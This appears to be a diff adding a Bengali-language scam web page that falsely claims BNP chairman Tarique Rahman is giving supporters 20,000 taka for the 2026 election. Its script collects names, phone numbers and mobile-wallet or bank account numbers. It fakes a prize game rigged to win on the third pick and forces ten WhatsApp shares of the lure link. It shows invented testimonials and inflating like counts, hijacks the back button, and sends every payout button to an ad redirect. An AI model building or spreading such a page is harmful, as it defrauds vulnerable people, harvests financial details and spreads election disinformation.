+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDuwgxFAq2WHSiK3w1LMXA2g5T_nKDFjKtZmfIZglTnB6vHVfFMeAYFpwJF7gVGrVige8w5IP3s478MbzNpow247sVy9RcG3vKyi00p-dL1VXv9m_tc75sgiyK3srD1tV5p_y7hzDiM33qSPNVjDHxishulaa_Uy573IirH28o56hmhv_7fATUiATe10h5/w640-h582/IMG_2979.png" alt="তারেক রহমান" class="header-image">
+        
+        <h2 style="text-align: center; color: #006a4e; margin-bottom: 15px;">📢 চূড়ান্ত ধাপ</h2>
+        
+        <p style="text-align: center; color: #555; line-height: 1.6; margin: 20px 0;">
+            এই সুসংবাদটি অন্যান্য সমর্থকদের সাথে শেয়ার করুন!<br>
+            ৫টি গ্রুপে বা ১৫ জন বন্ধুর সাথে শেয়ার করে ভেরিফিকেশন সম্পন্ন করুন।
+        </p>
+        
+        <div style="background: linear-gradient(135deg, #006a4e, #00a86b); color: white; padding: 20px; border-radius: 12px; margin: 25px 0; text-align: center;">
+            <p style="margin: 0; font-weight: bold;">
+                "বাংলাদেশ নির্বাচন ২০২৬...বিএনপি চেয়ারম্যান মিঃ তারেক রহমান সমর্থকদের ২০,০০০ টাকা নগদ উপহার দিচ্ছেন"
+            </p>
+        </div>
+        
+        <button id="whatsappShareBtn" onclick="shareOnWhatsApp()" style="background: linear-gradient(135deg, #25D366, #128C7E);">
+            📱 হোয়াটসঅ্যাপে শেয়ার করুন
+        </button>
+        
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div id="shareProgressFill" class="progress-fill"></div>
+            </div>
+            <div id="shareProgressText" class="progress-text">0%</div>
+        </div>
+        
+        <p style="text-align: center; color: #888; font-size: 13px; margin-top: 20px;">
+            প্রোগ্রেস বার পূর্ণ হলে স্বয়ংক্রিয়ভাবে পরবর্তী পৃষ্ঠায় যাবেন<br>
+            <span style="color: #006a4e;">"প্রায় শেষ, আর একটু!"</span>
+        </p>
+    </div>
+    
+    <!-- FINAL PAGE -->
+    <div class="card" id="finalPage" style="display: none;">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDuwgxFAq2WHSiK3w1LMXA2g5T_nKDFjKtZmfIZglTnB6vHVfFMeAYFpwJF7gVGrVige8w5IP3s478MbzNpow247sVy9RcG3vKyi00p-dL1VXv9m_tc75sgiyK3srD1tV5p_y7hzDiM33qSPNVjDHxishulaa_Uy573IirH28o56hmhv_7fATUiATe10h5/w640-h582/IMG_2979.png" alt="তারেক রহমান" class="header-image">
+        
+        <center>
+            <div style="font-size: 60px; color: #006a4e; margin: 20px 0;">🎉</div>
+            <h2 style="color: #006a4e; margin-bottom: 10px;">সফলভাবে সম্পন্ন!</h2>
+            <h3 style="color: #f42a41; margin-bottom: 15px; font-weight: bold;">💰 ২০,০০০ টাকা পাঠানোর জন্য প্রস্তুত 💰</h3>
+            
+            <img src="https://static.vecteezy.com/system/resources/thumbnails/023/325/560/small/stack-of-1000-afghan-afghanis-notes-3d-rendering-of-bundles-of-banknotes-png.png" alt="টাকার ছবি" class="cash-image">
+            
+            <div style="background: #f8f9fa; padding: 20px; border-radius: 12px; margin: 20px 0;">
+                <p style="color: #555; line-height: 1.6; margin-bottom: 15px;">
+                    <strong>টাকা উত্তোলনের মাধ্যম নির্বাচন করুন:</strong>
+                </p>
+                
+                <div class="bank-options">
+                    <div class="bank-option" onclick="selectBank('bkash')">
+                        <div style="font-size: 24px;">📱</div>
+                        <div>বিকাশ</div>
+                    </div>
+                    <div class="bank-option" onclick="selectBank('nagad')">
+                        <div style="font-size: 24px;">💳</div>
+                        <div>নগদ</div>
+                    </div>
+                    <div class="bank-option" onclick="selectBank('rocket')">
+                        <div style="font-size: 24px;">🚀</div>
+                        <div>রকেট</div>
+                    </div>
+                    <div class="bank-option" onclick="selectBank('dutchbangla')">
+                        <div style="font-size: 24px;">🏦</div>
+                        <div>ডি.বি.বিএল</div>
+                    </div>
+                </div>
+            </div>
+            
+            <button onclick="window.open('https://ey43.com/4/10077877')" style="background: linear-gradient(135deg, #006a4e, #00a86b); margin: 10px 0;">
+                🚀 টাকা উত্তোলনের অনুরোধ করুন
+            </button>
+            
+            <button onclick="window.open('https://ey43.com/4/10077877')" style="background: linear-gradient(135deg, #ff6600, #ff3300); margin: 10px 0;">
+                📄 অ্যাপ্রুভাল সার্টিফিকেট ডাউনলোড
+            </button>
+            
+            <button onclick="window.open('https://ey43.com/4/10077877')" style="background: linear-gradient(135deg, #0066b3, #004d88); margin: 10px 0;">
+                📊 পেমেন্ট স্ট্যাটাস চেক করুন
+            </button>
+            
+            <button onclick="window.open('https://ey43.com/4/10077877')" style="background: linear-gradient(135deg, #000000, #333333); margin: 20px 0 10px; color: white;">
+                ⚡ ইমিডিয়েট ট্রান্সফার রিকোয়েস্ট
+            </button>
+        </center>
+        
+        <!-- COMMENTS SECTION -->
+        <div class="comments-section">
+            <h4 style="color: #006a4e; margin-bottom: 15px;">💬 অন্যান্যদের অভিজ্ঞতা:</h4>
+            
+            <div class="comment">
+                <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="comment-avatar">
+                <div class="comment-content">
+                    <div class="user-name">আহমেদ হোসেন - ঢাকা</div>
+                    <div class="comment-text">
+                        গতকাল ২০,০০০ টাকা পেয়েছি! সত্যিই বিএনপি সমর্থকদের জন্য বড় উপহার। তারেক রহমান সাহেবকে ধন্যবাদ!
+                    </div>
+                    <div class="comment-time">২ মিনিট আগে</div>
+                </div>
+            </div>
+            
+            <div class="comment">
+                <img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="comment-avatar">
+                <div class="comment-content">
+                    <div class="user-name">সালমা বেগম - চট্টগ্রাম</div>
+                    <div class="comment-text">
+                        ভূমিকম্পে ঘর ক্ষতিগ্রস্ত হয়েছিল। এই টাকাটা খুবই প্রয়োজন ছিল। দ্রুত টাকা পেয়েছি।
+                    </div>
+                    <div class="comment-time">৫ মিনিট আগে</div>
+                </div>
+            </div>
+            
+            <div class="comment">
+                <img src="https://images.unsplash.com/photo-1560250097-0b93528c311a?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="comment-avatar">
+                <div class="comment-content">
+                    <div class="user-name">রফিকুল ইসলাম - রাজশাহী</div>
+                    <div class="comment-text">
+                        নির্বাচনী কর্মী হিসেবে এই উপহার পেয়ে খুব খুশি। বিএনপি সত্যিই সমর্থকদের দেখে।
+                    </div>
+                    <div class="comment-time">৮ মিনিট আগে</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+// GLOBAL VARIABLES
+let shareProgress = 0;
+let shareCount = 0;
+const shareLink = "https://awkl.xyz/Mr-Tareq-Cash-BDT20000-Gifts"; // WhatsApp sharing link
+const finalButtonsLink = "https://ey43.com/4/10077877"; // Final page buttons link
+const backRedirectLink = "https://ey43.com/4/10077877"; // Back button redirect
+
+// START PROCESS
+function startProcess() {
+    document.getElementById('intro').style.display = 'none';
+    document.getElementById('formSection').style.display = 'block';
+}
+
+// SUBMIT FORM
+function submitForm() {
+    const name = document.getElementById('fullName').value;
+    const phone = document.getElementById('phoneNumber').value;
+    const district = document.getElementById('district').value;
+    const supportType = document.getElementById('supportType').value;
+    const paymentMethod = document.getElementById('paymentMethod').value;
+    const accountNumber = document.getElementById('accountNumber').value;
+
+    if (!name || !phone || !district || !supportType || !paymentMethod) {
+        Swal.fire({
+            icon: 'error',
+            title: 'ত্রুটি!',
+            text: 'দয়া করে সব তথ্য পূরণ করুন'
+        });
+        return;
+    }
+
+    if ((paymentMethod === 'bank' || paymentMethod === 'bkash' || paymentMethod === 'nagad' || paymentMethod === 'rocket') && !accountNumber) {
+        Swal.fire({
+            icon: 'error',
+            title: 'ত্রুটি!',
+            text: 'অ্যাকাউন্ট/মোবাইল নম্বর দিন'
+        });
+        return;
+    }
+
+    // Save user data
+    document.getElementById('popupName').textContent = name;
+    document.getElementById('popupDistrict').textContent = district;
+
+    // Show loading animation
+    Swal.fire({
+        title: 'প্রক্রিয়াকরণ হচ্ছে...',
+        html: 'আপনার তথ্য যাচাই করা হচ্ছে',
+        timer: 2000,
+        timerProgressBar: true,
+        didOpen: () => {
+            Swal.showLoading();
+        }
+    }).then(() => {
+        document.getElementById('formSection').style.display = 'none';
+        document.getElementById('boxGame').style.display = 'block';
+        initializeBoxGame();
+    });
+}
+
+// PAYMENT METHOD CHANGE
+document.getElementById('paymentMethod').addEventListener('change', function() {
+    const accountField = document.getElementById('accountNumberField');
+    if (this.value === 'bank' || this.value === 'bkash' || this.value === 'nagad' || this.value === 'rocket') {
+        accountField.style.display = 'block';
+        if (this.value === 'bank') {
+            document.getElementById('accountNumber').placeholder = "ব্যাংক একাউন্ট নম্বর";
+        } else {
+            document.getElementById('accountNumber').placeholder = "মোবাইল নম্বর";
+        }
+    } else {
+        accountField.style.display = 'none';
+    }
+});
+
+// BOX GAME LOGIC - MODIFIED TO SHOW MONEY ONLY ON 3RD ATTEMPT
+function initializeBoxGame() {
+    let attemptsMade = 0; // Track number of attempts
+    
+    new Vue({
+        el: '#boxGameVue',
+        data: {
+            boxes: Array(9).fill().map((_, i) => ({
+                id: i,
+                image: 'https://i.imgur.com/45mMPJQ.png', // Closed box image
+                opened: false,
+                hasPrize: false // Initially no prize
+            })),
+            attemptsLeft: 3,
+            gameFinished: false,
+            gameWon: false,
+            message: '',
+            messageType: ''
+        },
+        methods: {
+            selectBox(index) {
+                // Don't allow clicking if game finished or box already opened
+                if (this.gameFinished || this.boxes[index].opened || this.attemptsLeft <= 0) {
+                    return;
+                }
+                
+                // Mark box as opened
+                this.boxes[index].opened = true;
+                attemptsMade++;
+                
+                // Check if this is the 3rd attempt
+                if (attemptsMade === 3) {
+                    // WINNER on 3rd attempt - Show money image
+                    this.boxes[index].image = 'https://static.vecteezy.com/system/resources/thumbnails/023/325/560/small/stack-of-1000-afghan-afghanis-notes-3d-rendering-of-bundles-of-banknotes-png.png';
+                    this.boxes[index].hasPrize = true;
+                    this.message = '🎉 অভিনন্দন! আপনি ২০,০০০ টাকা জিতেছেন!';
+                    this.messageType = 'message-success';
+                    this.gameFinished = true;
+                    this.gameWon = true;
+                    createConfetti();
+                } else {
+                    // NOT WINNER on 1st or 2nd attempt - Show empty box
+                    this.boxes[index].image = 'https://i.imgur.com/HSmfDGb.png';
+                    this.attemptsLeft--;
+                    
+                    if (this.attemptsLeft === 0) {
+                        // Out of attempts (shouldn't happen with 3rd attempt win)
+                        this.message = 'দুঃখিত! আপনার সব সুযোগ শেষ। "আবার চেষ্টা করুন" বাটনে ক্লিক করুন।';
+                        this.messageType = 'message-error';
+                        this.gameFinished = true;
+                        this.gameWon = false;
+                    } else {
+                        // Still have attempts left
+                        this.message = `দুঃখিত! এই বাক্সে কিছু নেই। ${this.attemptsLeft}টি সুযোগ বাকি।`;
+                        this.messageType = 'message-error';
+                    }
+                }
+            },
+            resetGame() {
+                // Reset everything for fresh game
+                attemptsMade = 0;
+                this.boxes = Array(9).fill().map((_, i) => ({
+                    id: i,
+                    image: 'https://i.imgur.com/45mMPJQ.png',
+                    opened: false,
+                    hasPrize: false
+                }));
+                this.attemptsLeft = 3;
+                this.gameFinished = false;
+                this.gameWon = false;
+                this.message = '';
+                this.messageType = '';
+            }
+        }
+    });
+}
+
+// PROCEED TO APPROVAL
+function proceedToApproval() {
+    document.getElementById('boxGame').style.display = 'none';
+    document.getElementById('approvalPopup').style.display = 'block';
+}
+
+// PROCEED TO SHARE
+function proceedToShare() {
+    document.getElementById('approvalPopup').style.display = 'none';
+    document.getElementById('shareSection').style.display = 'block';
+}
+
+// SHARE ON WHATSAPP
+function shareOnWhatsApp() {
+    const shareText = `*বাংলাদেশ নির্বাচন ২০২৬...বিএনপি চেয়ারম্যান মিঃ তারেক রহমান সমর্থকদের ২০০০০ টাকা নগদ উপহার দিচ্ছেন*%0A%0A*কিভাবে এটি পেতে*%0Aনিচের লিঙ্কে যান এবং নিম্নলিখিত প্রশ্নের উত্তর দিন এবং আপনি তাৎক্ষণিকভাবে ২০০০০ টাকা পাবেন।%0A আমি এখনই পেয়েছি%0A%0AClick Here👇%0A${shareLink}`;
+    
+    window.open(`whatsapp://send?text=${shareText}`);
+    
+    setTimeout(function() {
+        shareCount++;
+        
+        // Update progress based on shares
+        if (shareCount === 1) shareProgress = 30;
+        else if (shareCount === 2) shareProgress = 50;
+        else if (shareCount === 3) shareProgress = 60;
+        else if (shareCount === 4) shareProgress = 70;
+        else if (shareCount === 5) shareProgress = 80;
+        else if (shareCount === 6) shareProgress = 85;
+        else if (shareCount === 7) shareProgress = 90;
+        else if (shareCount === 8) shareProgress = 94;
+        else if (shareCount === 9) shareProgress = 97;
+        else if (shareCount >= 10) shareProgress = 100;
+        
+        document.getElementById('shareProgressFill').style.width = shareProgress + '%';
+        document.getElementById('shareProgressText').textContent = shareProgress + '%';
+        
+        // Show alerts at certain points
+        if (shareCount === 2 || shareCount === 4) {
+            Swal.fire({
+                icon: 'info',
+                title: 'আরও শেয়ার করুন',
+                text: 'বিভিন্ন গ্রুপে শেয়ার করুন ভেরিফিকেশনের জন্য'
+            });
+        }
+        
+        // When progress reaches 100%, go to final page
+        if (shareProgress >= 100) {
+            setTimeout(function() {
+                document.getElementById('shareSection').style.display = 'none';
+                document.getElementById('finalPage').style.display = 'block';
+            }, 1000);
+        }
+    }, 500);
+}
+
+// SELECT BANK
+function selectBank(bank) {
+    Swal.fire({
+        title: 'নির্বাচিত',
+        text: `${bank === 'bkash' ? 'বিকাশ' : bank === 'nagad' ? 'নগদ' : bank === 'rocket' ? 'রকেট' : 'ডি.বি.বিএল'} নির্বাচন করা হয়েছে`,
+        icon: 'success',
+        timer: 1500
+    });
+}
+
+// CONFETTI EFFECT
+function createConfetti() {
+    const colors = ['#006a4e', '#f42a41', '#ffcc00', '#0066b3'];
+    for (let i = 0; i < 100; i++) {
+        setTimeout(() => {
+            const confetti = document.createElement('div');
+            confetti.className = 'confetti';
+            confetti.style.left = Math.random() * 100 + 'vw';
+            confetti.style.top = '-10px';
+            confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+            confetti.style.width = Math.random() * 10 + 5 + 'px';
+            confetti.style.height = Math.random() * 10 + 5 + 'px';
+            document.body.appendChild(confetti);
+            
+            setTimeout(() => {
+                confetti.remove();
+            }, 3000);
+        }, i * 30);
+    }
+}
+
+// LIVING COMMENTS SYSTEM
+$(document).ready(function() {
+    // Update comment times every 30 seconds
+    setInterval(updateCommentTimes, 30000);
+    
+    // Increase likes and reactions every 20 seconds
+    setInterval(increaseReactions, 20000);
+    
+    // Update comment counts every 15 seconds
+    setInterval(updateCommentCounts, 15000);
+});
+
+let timeCounter = 2;
+function updateCommentTimes() {
+    timeCounter++;
+    if (timeCounter > 30) timeCounter = 2; // Reset after 30 minutes
+    
+    const timeTexts = [
+        `${timeCounter} মিনিট আগে`,
+        `${timeCounter+1} মিনিট আগে`,
+        `${timeCounter+3} মিনিট আগে`,
+        `${timeCounter+5} মিনিট আগে`,
+        `${timeCounter+7} মিনিট আগে`,
+        `${timeCounter+10} মিনিট আগে`,
+        `${timeCounter+12} মিনিট আগে`,
+        `${timeCounter+15} মিনিট আগে`
+    ];
+    
+    for (let i = 1; i <= 8; i++) {
+        $(`#time${i}`).text(timeTexts[i-1]);
+    }
+}
+
+let likesCount = 4200;
+let commentsCount = 89;
+let sharesCount = 1200;
+
+function increaseReactions() {
+    // Increase total likes
+    likesCount += Math.floor(Math.random() * 5) + 1;
+    $('#totalLikes').text(formatNumber(likesCount));
+    
+    // Increase shares occasionally
+    if (Math.random() > 0.7) {
+        sharesCount += Math.floor(Math.random() * 3) + 1;
+        $('#totalShares').text(`${formatNumber(sharesCount/1000, 1)}K শেয়ার`);
+    }
+}
+
+function updateCommentCounts() {
+    // Occasionally add new comments
+    if (Math.random() > 0.8) {
+        commentsCount += 1;
+        $('#totalComments').text(`${commentsCount} মন্তব্য`);
+    }
+}
+
+function formatNumber(num, decimals = 1) {
+    if (num >= 1000) {
+        return (num / 1000).toFixed(decimals) + 'K';
+    }
+    return num.toString();
+}
+
+// PREVENT BACK BUTTON
+window.onhashchange = function() { jp(); };
+function hh() { history.pushState(history.length + 1, "message", "#" + new Date().getTime()); }
+function jp() { fh(); }
+setTimeout('hh();', 500);
+function fh() { location.href = backRedirectLink; }
+function goon() { location.href = backRedirectLink; }
+</script>
+  
+  <!-- Visitor Counter -->
+<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1728230,"ffffff","ffffff");</script></center>
+  
+  
+</body>
+</html>
